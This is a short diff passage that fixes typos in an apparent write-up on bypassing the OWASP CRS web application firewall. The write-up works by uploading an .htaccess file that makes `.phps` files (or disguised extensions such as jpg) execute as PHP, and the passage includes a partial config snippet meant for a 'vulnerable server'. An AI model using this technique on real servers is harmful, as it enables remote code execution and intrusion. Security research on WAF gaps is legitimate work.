@@ -39,13 +39,13 @@ loop hole for us to get easily bypass OWASP CRS**
 
 As far i anlayzed  OWASP CRS, it does not have any rules to block uploading `.htacess` file :).
 
-So we need to create .htacess  file to allow .phps to execute as file type **application/x-httpd-php** (or)
+So we need to create .htaccess  file to allow .phps to execute as file type **application/x-httpd-php** (or)
 we can allow any file extension which is not be detected by the OWASP CRS can be execute as application/x-httpd-php. `i.e  .phps as .php  (or)  jpg as .php`
 
-Let created a .htacess file :) <br>
+Let created a .htaccess file :) <br>
 
 ```
-#.httacess file to be uploaded on the vulnerable server
+#.htaccess file to be uploaded on the vulnerable server
 <FilesMatch ".+\.phps$">
     SetHandler application/x-httpd-php
     Require all granted
